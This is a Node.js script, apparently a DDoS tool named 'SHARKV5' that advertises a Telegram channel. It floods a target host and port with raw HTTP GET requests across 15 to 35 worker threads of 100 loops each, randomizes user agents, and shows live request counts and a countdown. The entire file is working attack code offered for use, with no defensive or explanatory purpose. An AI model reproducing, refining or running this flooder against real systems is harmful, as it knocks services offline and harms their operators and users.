const net = require('net');
const { Worker, isMainThread, workerData } = require('worker_threads');
const readline = require('readline');

const TAGS = ['S.T.S', 'T.S.P', 'SL S.T.S TERROR'];
const THREADS_MIN = 15;
const THREADS_MAX = 35;
const LIVE_REFRESH_RATE = 100;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let rpsLastSecond = 0;
let maxRps = 0;
let end = 0;

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomUA() {
  const tag = TAGS[Math.floor(Math.random() * TAGS.length)];
  return `Mozilla/5.0 (SHARK/${Math.random().toFixed(5)}) ${tag}`;
}

if (isMainThread) {
  if (process.argv.length < 4) {
    console.error("Usage: node sharkv5-v3.js <host:port> <duration_sec>");
    process.exit(1);
  }

  const [host, port] = process.argv[2].split(':');
  const duration = parseInt(process.argv[3]);
  end = Date.now() + duration * 1000;

  let activeThreads = getRandomInt(THREADS_MIN, THREADS_MAX);
  for (let i = 0; i < activeThreads; i++) {
    new Worker(__filename, { workerData: { host, port, duration } });
  }

  setInterval(() => {
    maxRps = Math.max(maxRps, rpsLastSecond);
    rpsLastSecond = 0;
  }, 1000);

  setInterval(() => renderStats(), LIVE_REFRESH_RATE);

  function renderStats() {
    const remaining = Math.max(0, end - Date.now());
    const mins = Math.floor(remaining / 60000);
    const secs = Math.floor((remaining % 60000) / 1000);

    readline.cursorTo(process.stdout, 0, 0);
    readline.clearScreenDown(process.stdout);
    console.log(`SHARKV5 - T.ME/STSVKINGDOM`);
    console.log(`==============================`);
    console.log(`total: ${totalRequests}`);
    console.log(`max-r: ${maxRps}`);
    console.log(`==============================`);
    console.log(`succes: ${successCount}`);
    console.log(`vape: ${errorCount}`);
    console.log(`==============================`);
    console.log(`REMAINING: ${mins}:${secs < 10 ? '0' : ''}${secs}`);
  }

  const server = net.createServer(socket => {
    socket.on('data', data => {
      const msg = data.toString();
      if (msg === 'ok') {
        successCount++;
        totalRequests++;
        rpsLastSecond++;
      } else if (msg === 'err') {
        errorCount++;
        totalRequests++;
      }
    });
  });
  server.listen(9999);

} else {
  const { host, port, duration } = workerData;
  const endTime = Date.now() + duration * 1000;
  const control = net.connect(9999, '127.0.0.1');
  const notify = msg => control.write(msg);

  function createRawRequest() {
    return [
      `GET / HTTP/1.1`,
      `Host: ${host}`,
      `User-Agent: ${randomUA()}`,
      `Connection: close`,
      `\r\n`
    ].join('\r\n');
  }

  function flood() {
    if (Date.now() > endTime) return;
    const socket = new net.Socket();

    socket.connect(port, host, () => {
      try {
        socket.write(createRawRequest());
        notify('ok');
      } catch {
        notify('err');
      }
      socket.destroy();
    });

    socket.on('error', () => {
      notify('err');
    });

    setImmediate(flood);
  }

  // Launch 100 fire-and-forget loops
  for (let i = 0; i < 100; i++) flood();
}
